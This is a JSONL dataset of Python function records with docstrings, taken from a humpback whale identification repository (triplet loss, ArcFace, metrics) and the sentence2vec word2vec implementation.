{"docstring": "\"\"\"\nArgs:\n  tri_loss: a `TripletLoss` object\n  global_feat: pytorch Variable, shape [N, C]\n  labels: pytorch LongTensor, with shape [N]\n  normalize_feature: whether to normalize feature to unit length along the\n    Channel dimension\nReturns:\n  loss: pytorch Variable, with shape [1]\n  p_inds: pytorch LongTensor, with shape [N];\n    indices of selected hard positive samples; 0 <= p_inds[i] <= N - 1\n  n_inds: pytorch LongTensor, with shape [N];\n    indices of selected hard negative samples; 0 <= n_inds[i] <= N - 1\n  =============\n  For Debugging\n  =============\n  dist_ap: pytorch Variable, distance(anchor, positive); shape [N]\n  dist_an: pytorch Variable, distance(anchor, negative); shape [N]\n  ===================\n  For Mutual Learning\n  ===================\n  dist_mat: pytorch Variable, pairwise euclidean distance; shape [N, N]\n\"\"\"\n", "func_signal": "def global_loss(tri_loss, global_feat, labels, normalize_feature=False):\n", "code": "if normalize_feature:\n    global_feat = normalize(global_feat, axis=-1)\n# shape [N, N]\ndist_mat = euclidean_dist(global_feat, global_feat)\ndist_ap, dist_an = hard_example_mining(\n    dist_mat, labels, return_inds=False)\nloss = tri_loss(dist_ap, dist_an)\nreturn loss, dist_ap, dist_an, dist_mat", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"\nArgs:\n  x: pytorch Variable, with shape [m, d]\n  y: pytorch Variable, with shape [n, d]\nReturns:\n  dist: pytorch Variable, with shape [m, n]\n\"\"\"\n", "func_signal": "def euclidean_dist(x, y):\n", "code": "m, n = x.size(0), y.size(0)\nxx = torch.pow(x, 2).sum(1, keepdim=True).expand(m, n)\nyy = torch.pow(y, 2).sum(1, keepdim=True).expand(n, m).t()\ndist = xx + yy\ndist.addmm_(1, -2, x, y.t())\ndist = dist.clamp(min=1e-12).sqrt()  # for numerical stability\nreturn dist", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"\nArgs:\n  x: pytorch Variable, with shape [M, m, d]\n  y: pytorch Variable, with shape [N, n, d]\nReturns:\n  dist: pytorch Variable, with shape [M, N]\n\"\"\"\n", "func_signal": "def local_dist(x, y):\n", "code": "M, m, d = x.size()\nN, n, d = y.size()\nx = x.contiguous().view(M * m, d)\ny = y.contiguous().view(N * n, d)\n# shape [M * m, N * n]\ndist_mat = euclidean_dist(x, y)\ndist_mat = (torch.exp(dist_mat) - 1.) / (torch.exp(dist_mat) + 1.)\n# shape [M * m, N * n] -> [M, m, N, n] -> [m, n, M, N]\ndist_mat = dist_mat.contiguous().view(M, m, N, n).permute(1, 3, 0, 2)\n# shape [M, N]\ndist_mat = shortest_dist(dist_mat)\nreturn dist_mat", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"\nArgs:\n  x: pytorch Variable, with shape [N, m, d]\n  y: pytorch Variable, with shape [N, n, d]\nReturns:\n  dist: pytorch Variable, with shape [N]\n\"\"\"\n", "func_signal": "def batch_local_dist(x, y):\n", "code": "assert len(x.size()) == 3\nassert len(y.size()) == 3\nassert x.size(0) == y.size(0)\nassert x.size(-1) == y.size(-1)\n\n# shape [N, m, n]\ndist_mat = batch_euclidean_dist(x, y)\ndist_mat = (torch.exp(dist_mat) - 1.) / (torch.exp(dist_mat) + 1.)\n# shape [N]\ndist = shortest_dist(dist_mat.permute(1, 2, 0))\nreturn dist", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"Computes the precision@k for the specified values of k\"\"\"\n", "func_signal": "def accuracy(output, target, topk=(1, 5)):\n", "code": "maxk = max(topk)\nbatch_size = target.size(0)\n\n_, pred = output.topk(maxk, 1, True, True)\npred = pred.t()\ncorrect = pred.eq(target.view(1, -1).expand_as(pred))\n\nres = []\nfor k in topk:\n    correct_k = correct[:k].view(-1).float().sum(0, keepdim=True)\n    res.append(correct_k.mul_(100.0 / batch_size))\nreturn res", "path": "utils\\metric.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"\nArgs:\n  x: pytorch Variable, with shape [m, d]\n  y: pytorch Variable, with shape [n, d]\nReturns:\n  dist: pytorch Variable, with shape [m, n]\n\"\"\"\n", "func_signal": "def euclidean_dist(x, y):\n", "code": "m, n = x.size(0), y.size(0)\nxx = torch.pow(x, 2).sum(1, keepdim=True).expand(m, n)\nyy = torch.pow(y, 2).sum(1, keepdim=True).expand(n, m).t()\ndist = xx + yy\ndist.addmm_(1, -2, x, y.t())\ndist = dist.clamp(min=1e-12).sqrt()  # for numerical stability\nreturn dist", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"Normalizing to unit length along the specified dimension.\nArgs:\n  x: pytorch Variable\nReturns:\n  x: pytorch Variable, same shape as input\n\"\"\"\n", "func_signal": "def normalize(x, axis=-1):\n", "code": "x = 1. * x / (torch.norm(x, 2, axis, keepdim=True).expand_as(x) + 1e-12)\nreturn x", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"Cosine rampdown from https://arxiv.org/abs/1608.03983\"\"\"\n", "func_signal": "def cosine_rampdown(current, rampdown_length):\n", "code": "assert 0 <= current <= rampdown_length\nreturn float(.5 * (np.cos(np.pi * current / rampdown_length) + 1))", "path": "utils\\metric.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "# weights norm\n", "func_signal": "def forward(self, embbedings, label):\n", "code": "nB = len(embbedings)\nkernel_norm = l2_norm(self.kernel, axis=0)\n# cos(theta+m)\ncos_theta = torch.mm(embbedings,kernel_norm)", "path": "models\\arcFaceloss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"Linear rampup\"\"\"\n", "func_signal": "def linear_rampup(current, rampup_length):\n", "code": "assert current >= 0 and rampup_length >= 0\nif current >= rampup_length:\n    return 1.0\nelse:\n    return current / rampup_length", "path": "utils\\metric.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "# weights norm\n", "func_signal": "def forward(self, embbedings):\n", "code": "kernel_norm = l2_norm(self.kernel, axis=0)\n# cos(theta+m)\ncos_theta = torch.mm(embbedings, kernel_norm)\n#         output = torch.mm(embbedings,kernel_norm)\ncos_theta = cos_theta.clamp(-1, 1)  # for numerical stability\noutput = cos_theta * 1.0  # a little bit hacky way to prevent in_place operation on cos_theta\noutput *= self.s  # scale up in order to make softmax work, first introduced in normface\nreturn output", "path": "models\\arcFaceloss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "# weights norm\n", "func_signal": "def inter(self, embbedings):\n", "code": "kernel_norm = l2_norm(self.kernel, axis=0)\n# cos(theta+m)\ncos_theta = torch.mm(embbedings, kernel_norm)\n#         output = torch.mm(embbedings,kernel_norm)\ncos_theta = cos_theta.clamp(-1, 1)  # for numerical stability\noutput = cos_theta * 1.0  # a little bit hacky way to prevent in_place operation on cos_theta\noutput *= self.s  # scale up in order to make softmax work, first introduced in normface\nreturn output", "path": "models\\arcFaceloss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"\nArgs:\n  x: pytorch Variable, with shape [N, m, d]\n  y: pytorch Variable, with shape [N, n, d]\nReturns:\n  dist: pytorch Variable, with shape [N, m, n]\n\"\"\"\n", "func_signal": "def batch_euclidean_dist(x, y):\n", "code": "assert len(x.size()) == 3\nassert len(y.size()) == 3\nassert x.size(0) == y.size(0)\nassert x.size(-1) == y.size(-1)\n\nN, m, d = x.size()\nN, n, d = y.size()\n\n# shape [N, m, n]\nxx = torch.pow(x, 2).sum(-1, keepdim=True).expand(N, m, n)\nyy = torch.pow(y, 2).sum(-1, keepdim=True).expand(N, n, m).permute(0, 2, 1)\ndist = xx + yy\ndist.baddbmm_(1, -2, x, y.permute(0, 2, 1))\ndist = dist.clamp(min=1e-12).sqrt()  # for numerical stability\nreturn dist", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"PolyNet architecture from the paper\n'PolyNet: A Pursuit of Structural Diversity in Very Deep Networks'\nhttps://arxiv.org/abs/1611.05725\n\"\"\"\n", "func_signal": "def polynet(num_classes=1000, pretrained='imagenet'):\n", "code": "if pretrained:\n    settings = pretrained_settings['polynet'][pretrained]\n    assert num_classes == settings['num_classes'], \\\n        'num_classes should be {}, but is {}'.format(\n            settings['num_classes'], num_classes)\n    model = PolyNet(num_classes=num_classes)\n    model.load_state_dict(model_zoo.load_url(settings['url']))\n    model.input_space = settings['input_space']\n    model.input_size = settings['input_size']\n    model.input_range = settings['input_range']\n    model.mean = settings['mean']\n    model.std = settings['std']\nelse:\n    model = PolyNet(num_classes=num_classes)\nreturn model", "path": "models\\modelZoo\\ployNet.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"For each anchor, find the hardest positive and negative sample.\nArgs:\n  dist_mat: pytorch Variable, pair wise distance between samples, shape [N, N]\n  labels: pytorch LongTensor, with shape [N]\n  return_inds: whether to return the indices. Save time if `False`(?)\nReturns:\n  dist_ap: pytorch Variable, distance(anchor, positive); shape [N]\n  dist_an: pytorch Variable, distance(anchor, negative); shape [N]\n  p_inds: pytorch LongTensor, with shape [N];\n    indices of selected hard positive samples; 0 <= p_inds[i] <= N - 1\n  n_inds: pytorch LongTensor, with shape [N];\n    indices of selected hard negative samples; 0 <= n_inds[i] <= N - 1\nNOTE: Only consider the case in which all labels have same num of samples,\n  thus we can cope with all anchors in parallel.\n\"\"\"\n\n", "func_signal": "def hard_example_mining(dist_mat, labels, return_inds=False):\n", "code": "assert len(dist_mat.size()) == 2\nassert dist_mat.size(0) == dist_mat.size(1)\nN = dist_mat.size(0)\n\n# shape [N, N]\nnew_whale_indexs = (labels == 5004 * 2).nonzero()\nis_pos = labels.expand(N, N).eq(labels.expand(N, N).t())\nis_neg = labels.expand(N, N).ne(labels.expand(N, N).t())\nfor i in new_whale_indexs:\n    is_pos[i, :] = 0\n    is_pos[:, i] = 0\n    is_pos[i, i] = 1\n\n# `dist_ap` means distance(anchor, positive)\n# both `dist_ap` and `relative_p_inds` with shape [N, 1]\ndist_ap, relative_p_inds = torch.max(\n    (dist_mat * is_pos.float()).contiguous().view(N, -1), 1, keepdim=True)\n# `dist_an` means distance(anchor, negative)\n# both `dist_an` and `relative_n_inds` with shape [N, 1]\ntemp = dist_mat * is_neg.float()\ntemp[temp == 0] = 10e5\ndist_an, relative_n_inds = torch.min(\n    (temp).contiguous().view(N, -1), 1, keepdim=True)\n# shape [N]\ndist_ap = dist_ap.squeeze(1)\ndist_an = dist_an.squeeze(1)\n\nif return_inds:\n    # shape [N, N]\n    ind = (labels.new().resize_as_(labels)\n           .copy_(torch.arange(0, N).long())\n           .unsqueeze(0).expand(N, N))\n    # shape [N, 1]\n    p_inds = torch.gather(\n        ind[is_pos].contiguous().view(N, -1), 1, relative_p_inds.data)\n    n_inds = torch.gather(\n        ind[is_neg].contiguous().view(N, -1), 1, relative_n_inds.data)\n    # shape [N]\n    p_inds = p_inds.squeeze(1)\n    n_inds = n_inds.squeeze(1)\n    return dist_ap, dist_an, p_inds, n_inds\n\nreturn dist_ap, dist_an", "path": "models\\triplet_loss.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"Exponential rampup from https://arxiv.org/abs/1610.02242\"\"\"\n", "func_signal": "def sigmoid_rampup(current, rampup_length):\n", "code": "if rampup_length == 0:\n    return 1.0\nelse:\n    current = np.clip(current, 0.0, rampup_length)\n    phase = 1.0 - current / rampup_length\n    return float(np.exp(-5 * phase * phase))", "path": "utils\\metric.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "# Image,x0,y0,x1,y1\n", "func_signal": "def load_bbox(self):\n", "code": "print('loading bbox...')\nbbox = pd.read_csv('./input/bboxs.csv')\nImages = bbox['Image'].tolist()\nx0s = bbox['x0'].tolist()\ny0s = bbox['y0'].tolist()\nx1s = bbox['x1'].tolist()\ny1s = bbox['y1'].tolist()\nbbox_dict = {}\nfor Image,x0,y0,x1,y1 in zip(Images,x0s,y0s,x1s,y1s):\n    bbox_dict[Image] = [x0, y0, x1, y1]\nreturn bbox_dict", "path": "dataSet\\reader.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"Sets the learning rate to the initial LR decayed by 10 every 30 epochs\"\"\"\n", "func_signal": "def adjust_learning_rate(optimizer, lr):\n", "code": "for param_group in optimizer.param_groups:\n    param_group['lr'] = lr", "path": "utils\\optim.py", "repo_name": "earhian/Humpback-Whale-Identification-1st-", "stars": 633, "license": "None", "language": "python", "size": 9893}
{"docstring": "\"\"\"Iterate through the lines in the source.\"\"\"\n", "func_signal": "def __iter__(self):\n", "code": "try:\n    # Assume it is a file-like object and try treating it as such\n    # Things that don't have seek will trigger an exception\n    self.source.seek(0)\n    for line in self.source:\n        yield utils.to_unicode(line).split()\nexcept AttributeError:\n    # If it didn't work like a file, use it as a string filename\n    with utils.smart_open(self.source) as fin:\n        for line in fin:\n            yield utils.to_unicode(line).split()", "path": "word2vec.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nSkip file headers that appear before the first document.\n\"\"\"\n", "func_signal": "def skip_headers(self, input_file):\n", "code": "for line in input_file:\n    if line.startswith(b'%'):\n        continue\n    break", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nSave the vector space representation of an entire corpus to disk.\n\nNote that the documents are processed one at a time, so the whole corpus\nis allowed to be larger than the available RAM.\n\"\"\"\n", "func_signal": "def write_corpus(fname, corpus, progress_cnt=1000, index=False, num_terms=None, metadata=False):\n", "code": "mw = MmWriter(fname)\n\n# write empty headers to the file (with enough space to be overwritten later)\nmw.write_headers(-1, -1, -1) # will print 50 spaces followed by newline on the stats line\n\n# calculate necessary header info (nnz elements, num terms, num docs) while writing out vectors\n_num_terms, num_nnz = 0, 0\ndocno, poslast = -1, -1\noffsets = []\nif hasattr(corpus, 'metadata'):\n    orig_metadata = corpus.metadata\n    corpus.metadata = metadata\n    if metadata:\n        docno2metadata = {}\nelse:\n    metadata = False\nfor docno, doc in enumerate(corpus):\n    if metadata:\n        bow, data = doc\n        docno2metadata[docno] = data\n    else:\n        bow = doc\n    if docno % progress_cnt == 0:\n        logger.info(\"PROGRESS: saving document #%i\" % docno)\n    if index:\n        posnow = mw.fout.tell()\n        if posnow == poslast:\n            offsets[-1] = -1\n        offsets.append(posnow)\n        poslast = posnow\n    max_id, veclen = mw.write_vector(docno, bow)\n    _num_terms = max(_num_terms, 1 + max_id)\n    num_nnz += veclen\nif metadata:\n    utils.pickle(docno2metadata, fname + '.metadata.cpickle')\n    corpus.metadata = orig_metadata\n\nnum_docs = docno + 1\nnum_terms = num_terms or _num_terms\n\nif num_docs * num_terms != 0:\n    logger.info(\"saved %ix%i matrix, density=%.3f%% (%i/%i)\" % (\n        num_docs, num_terms,\n        100.0 * num_nnz / (num_docs * num_terms),\n        num_nnz,\n        num_docs * num_terms))\n\n# now write proper headers, by seeking and overwriting the spaces written earlier\nmw.fake_headers(num_docs, num_terms, num_nnz)\n\nmw.close()\nif index:\n    return offsets", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nReturn cosine similarity between two sparse vectors.\nThe similarity is a number between <-1.0, 1.0>, higher is more similar.\n\"\"\"\n", "func_signal": "def cossim(vec1, vec2):\n", "code": "vec1, vec2 = dict(vec1), dict(vec2)\nif not vec1 or not vec2:\n    return 0.0\nvec1len = 1.0 * math.sqrt(sum(val * val for val in itervalues(vec1)))\nvec2len = 1.0 * math.sqrt(sum(val * val for val in itervalues(vec2)))\nassert vec1len > 0.0 and vec2len > 0.0, \"sparse documents must not contain any explicit zero entries\"\nif len(vec2) < len(vec1):\n    vec1, vec2 = vec2, vec1 # swap references so that we iterate over the shorter vector\nresult = sum(value * vec2.get(index, 0.0) for index, value in iteritems(vec1))\nresult /= vec1len * vec2len # rescale by vector lengths\nreturn result", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"Return document at file offset `offset` (in bytes)\"\"\"\n# empty documents are not stored explicitly in MM format, so the index marks\n# them with a special offset, -1.\n", "func_signal": "def docbyoffset(self, offset):\n", "code": "if offset == -1:\n    return []\nif isinstance(self.input, string_types):\n    fin = open(self.input)\nelse:\n    fin = self.input\n\nfin.seek(offset) # works for gzip/bz2 input, too\nprevid, document = -1, []\nfor line in fin:\n    docid, termid, val = line.split()\n    if not self.transposed:\n        termid, docid = docid, termid\n    docid, termid, val = int(docid) - 1, int(termid) - 1, float(val) # -1 because matrix market indexes are 1-based => convert to 0-based\n    assert previd <= docid, \"matrix columns must come in ascending order\"\n    if docid != previd:\n        if previd >= 0:\n            return document\n        previd = docid\n\n    document.append((termid, val,)) # add another field to the current document\nreturn document", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nAdd additional rows/columns to a numpy.matrix `mat`. The new rows/columns\nwill be initialized with zeros.\n\"\"\"\n", "func_signal": "def pad(mat, padrow, padcol):\n", "code": "if padrow < 0:\n    padrow = 0\nif padcol < 0:\n    padcol = 0\nrows, cols = mat.shape\nreturn numpy.bmat([[mat, numpy.matrix(numpy.zeros((rows, padcol)))],\n                  [numpy.matrix(numpy.zeros((padrow, cols + padcol)))]])", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nUpdate CBOW model by training on a single sentence.\n\nThe sentence is a list of Vocab objects (or None, where the corresponding\nword is not in the vocabulary. Called internally from `Word2Vec.train()`.\n\nThis is the non-optimized, Python version. If you have cython installed, gensim\nwill use the optimized version from word2vec_inner instead.\n\n\"\"\"\n", "func_signal": "def train_sent_vec_cbow(self, model, sent_no, sentence, alpha, work=None, neu1=None):\n", "code": "sent_vec = self.sents[sent_no]\nif self.negative:\n    # precompute negative labels\n    labels = zeros(self.negative + 1)\n    labels[0] = 1.\n\nfor pos, word in enumerate(sentence):\n    if word is None:\n        continue  # OOV word in the input sentence => skip\n    reduced_window = random.randint(self.window) # `b` in the original word2vec code\n    start = max(0, pos - self.window + reduced_window)\n    window_pos = enumerate(sentence[start : pos + self.window + 1 - reduced_window], start)\n    word2_indices = [word2.index for pos2, word2 in window_pos if (word2 is not None and pos2 != pos)]\n    l1 = np_sum(model.syn0[word2_indices], axis=0) # 1 x layer1_size\n    l1 += sent_vec\n    if word2_indices and self.cbow_mean:\n        l1 /= len(word2_indices)\n    neu1e = zeros(l1.shape)\n\n    if self.hs:\n        l2a = model.syn1[word.point] # 2d matrix, codelen x layer1_size\n        fa = 1. / (1. + exp(-dot(l1, l2a.T))) # propagate hidden -> output\n        ga = (1. - word.code - fa) * alpha # vector of error gradients multiplied by the learning rate\n        # model.syn1[word.point] += outer(ga, l1) # learn hidden -> output\n        neu1e += dot(ga, l2a) # save error\n\n    if self.negative:\n        # use this word (label = 1) + `negative` other random words not from this sentence (label = 0)\n        word_indices = [word.index]\n        while len(word_indices) < self.negative + 1:\n            w = model.table[random.randint(model.table.shape[0])]\n            if w != word.index:\n                word_indices.append(w)\n        l2b = model.syn1neg[word_indices] # 2d matrix, k+1 x layer1_size\n        fb = 1. / (1. + exp(-dot(l1, l2b.T))) # propagate hidden -> output\n        gb = (labels - fb) * alpha # vector of error gradients multiplied by the learning rate\n        # model.syn1neg[word_indices] += outer(gb, l1) # learn hidden -> output\n        neu1e += dot(gb, l2b) # save error\n\n    # model.syn0[word2_indices] += neu1e # learn input -> hidden, here for all words in the window separately\n    self.sents[sent_no] += neu1e # learn input -> hidden, here for all words in the window separately\n\nreturn len([word for word in sentence if word is not None])", "path": "word2vec.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nConvert corpus into a dense numpy array (documents will be columns). You\nmust supply the number of features `num_terms`, because dimensionality\ncannot be deduced from the sparse vectors alone.\n\nYou can optionally supply `num_docs` (=the corpus length) as well, so that\na more memory-efficient code path is taken.\n\nThis is the mirror function to `Dense2Corpus`.\n\n\"\"\"\n", "func_signal": "def corpus2dense(corpus, num_terms, num_docs=None, dtype=numpy.float32):\n", "code": "if num_docs is not None:\n    # we know the number of documents => don't bother column_stacking\n    docno, result = -1, numpy.empty((num_terms, num_docs), dtype=dtype)\n    for docno, doc in enumerate(corpus):\n        result[:, docno] = sparse2full(doc, num_terms)\n    assert docno + 1 == num_docs\nelse:\n    result = numpy.column_stack(sparse2full(doc, num_terms) for doc in corpus)\nreturn result.astype(dtype)", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "# the entire corpus is one gigantic line -- there are no sentence marks at all\n# so just split the sequence of tokens arbitrarily: 1 sentence = 1000 tokens\n", "func_signal": "def __iter__(self):\n", "code": "sentence, rest, max_sentence_length = [], b'', 1000\nwith utils.smart_open(self.fname) as fin:\n    while True:\n        text = rest + fin.read(8192)  # avoid loading the entire file (=1 line) into RAM\n        if text == rest:  # EOF\n            sentence.extend(rest.split()) # return the last chunk of words, too (may be shorter/longer)\n            if sentence:\n                yield sentence\n            break\n        last_token = text.rfind(b' ')  # the last token may have been split in two... keep it for the next iteration\n        words, rest = (utils.to_unicode(text[:last_token]).split(), text[last_token:].strip()) if last_token >= 0 else ([], text)\n        sentence.extend(words)\n        while len(sentence) >= max_sentence_length:\n            yield sentence[:max_sentence_length]\n            sentence = sentence[max_sentence_length:]", "path": "word2vec.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nBuild vocabulary from a sequence of sentences (can be a once-only generator stream).\nEach sentence must be a list of unicode strings.\n\n\"\"\"\n", "func_signal": "def build_vocab(self, sentences):\n", "code": "logger.info(\"collecting all words and their counts\")\nsentence_no, vocab = -1, {}\ntotal_words = 0\nfor sentence_no, sentence in enumerate(sentences):\n    if sentence_no % 10000 == 0:\n        logger.info(\"PROGRESS: at sentence #%i, processed %i words and %i word types\" %\n            (sentence_no, total_words, len(vocab)))\n    for word in sentence:\n        total_words += 1\n        if word in vocab:\n            vocab[word].count += 1\n        else:\n            vocab[word] = Vocab(count=1)\nlogger.info(\"collected %i word types from a corpus of %i words and %i sentences\" %\n    (len(vocab), total_words, sentence_no + 1))\n\n# assign a unique index to each word\nself.vocab, self.index2word = {}, []\nfor word, v in iteritems(vocab):\n    if v.count >= self.min_count:\n        v.index = len(self.vocab)\n        self.index2word.append(word)\n        self.vocab[word] = v\nlogger.info(\"total %i word types after removing those with count<%s\" % (len(self.vocab), self.min_count))\n\nif self.hs:\n    # add info about each word's Huffman encoding\n    self.create_binary_tree()\nif self.negative:\n    # build the table for drawing random words (for negative sampling)\n    self.make_table()\n# precalculate downsampling thresholds\nself.precalc_sampling()\nself.reset_weights()", "path": "word2vec.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nFind the top-N most similar words. Positive words contribute positively towards the\nsimilarity, negative words negatively.\n\nThis method computes cosine similarity between a simple mean of the projection\nweight vectors of the given words, and corresponds to the `word-analogy` and\n`distance` scripts in the original word2vec implementation.\n\nExample::\n\n  >>> trained_model.most_similar(positive=['woman', 'king'], negative=['man'])\n  [('queen', 0.50882536), ...]\n\n\"\"\"\n", "func_signal": "def most_similar(self, positive=[], negative=[], topn=10):\n", "code": "self.init_sims()\n\nif isinstance(positive, string_types) and not negative:\n    # allow calls like most_similar('dog'), as a shorthand for most_similar(['dog'])\n    positive = [positive]\n\n# add weights for each word, if not already present; default to 1.0 for positive and -1.0 for negative words\npositive = [(word, 1.0) if isinstance(word, string_types + (ndarray,))\n                        else word for word in positive]\nnegative = [(word, -1.0) if isinstance(word, string_types + (ndarray,))\n                         else word for word in negative]\n\n# compute the weighted average of all words\nall_words, mean = set(), []\nfor word, weight in positive + negative:\n    if isinstance(word, ndarray):\n        mean.append(weight * word)\n    elif word in self.vocab:\n        mean.append(weight * self.syn0norm[self.vocab[word].index])\n        all_words.add(self.vocab[word].index)\n    else:\n        raise KeyError(\"word '%s' not in vocabulary\" % word)\nif not mean:\n    raise ValueError(\"cannot compute similarity with no input\")\nmean = matutils.unitvec(array(mean).mean(axis=0)).astype(REAL)\n\ndists = dot(self.syn0norm, mean)\nif not topn:\n    return dists\nbest = argsort(dists)[::-1][:topn + len(all_words)]\n# ignore (don't return) words from the input\nresult = [(self.index2word[sim], float(dists[sim])) for sim in best if sim not in all_words]\nreturn result[:topn]", "path": "word2vec.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"Precalculate each vocabulary item's threshold for sampling\"\"\"\n", "func_signal": "def precalc_sampling(self):\n", "code": "if self.sample:\n    logger.info(\"frequent-word downsampling, threshold %g; progress tallies will be approximate\" % (self.sample))\n    total_words = sum(v.count for v in itervalues(self.vocab))\n    threshold_count = float(self.sample) * total_words\nfor v in itervalues(self.vocab):\n    prob = (sqrt(v.count / threshold_count) + 1) * (threshold_count / v.count) if self.sample else 1.0\n    v.sample_probability = min(prob, 1.0)", "path": "word2vec.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nUpdate skip-gram model by training on a single sentence.\n\nThe sentence is a list of Vocab objects (or None, where the corresponding\nword is not in the vocabulary. Called internally from `Word2Vec.train()`.\n\nThis is the non-optimized, Python version. If you have cython installed, gensim\nwill use the optimized version from word2vec_inner instead.\n\n\"\"\"\n", "func_signal": "def train_sent_vec_sg(self, model, sent_no, sentence, alpha, work=None):\n", "code": "if self.negative:\n    # precompute negative labels\n    labels = zeros(self.negative + 1)\n    labels[0] = 1.0\n\nfor pos, word in enumerate(sentence):\n    if word is None:\n        continue  # OOV word in the input sentence => skip\n    reduced_window = random.randint(model.window)  # `b` in the original word2vec code\n\n    # now go over all words from the (reduced) window, predicting each one in turn\n    start = max(0, pos - model.window + reduced_window)\n    for pos2, word2 in enumerate(sentence[start : pos + model.window + 1 - reduced_window], start):\n        # don't train on OOV words and on the `word` itself\n        if word2:\n            # l1 = model.syn0[word.index]\n            l1 = self.sents[sent_no]\n            neu1e = zeros(l1.shape)\n\n            if self.hs:\n                # work on the entire tree at once, to push as much work into numpy's C routines as possible (performance)\n                l2a = deepcopy(model.syn1[word2.point])  # 2d matrix, codelen x layer1_size\n                fa = 1.0 / (1.0 + exp(-dot(l1, l2a.T)))  #  propagate hidden -> output\n                ga = (1 - word2.code - fa) * alpha  # vector of error gradients multiplied by the learning rate\n                # model.syn1[word2.point] += outer(ga, l1)  # learn hidden -> output\n                neu1e += dot(ga, l2a) # save error\n\n            if self.negative:\n                # use this word (label = 1) + `negative` other random words not from this sentence (label = 0)\n                word_indices = [word2.index]\n                while len(word_indices) < model.negative + 1:\n                    w = model.table[random.randint(model.table.shape[0])]\n                    if w != word2.index:\n                        word_indices.append(w)\n                l2b = model.syn1neg[word_indices] # 2d matrix, k+1 x layer1_size\n                fb = 1. / (1. + exp(-dot(l1, l2b.T))) # propagate hidden -> output\n                gb = (labels - fb) * alpha # vector of error gradients multiplied by the learning rate\n                # model.syn1neg[word_indices] += outer(gb, l1) # learn hidden -> output\n                neu1e += dot(gb, l2b) # save error\n\n            # model.syn0[word.index] += neu1e  # learn input -> hidden\n            self.sents[sent_no] += neu1e  # learn input -> hidden\n\nreturn len([word for word in sentence if word is not None])", "path": "word2vec.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
{"docstring": "\"\"\"\nConvert a dense numpy array into the sparse document format (sequence of 2-tuples).\n\nValues of magnitude < `eps` are treated as zero (ignored).\n\nThis is the mirror function to `sparse2full`.\n\n\"\"\"\n", "func_signal": "def full2sparse(vec, eps=1e-9):\n", "code": "vec = numpy.asarray(vec, dtype=float)\nnnz = numpy.nonzero(abs(vec) > eps)[0]\nreturn list(zip(nnz, vec.take(nnz)))", "path": "matutils.py", "repo_name": "klb3713/sentence2vec", "stars": 666, "license": "None", "language": "python", "size": 198}
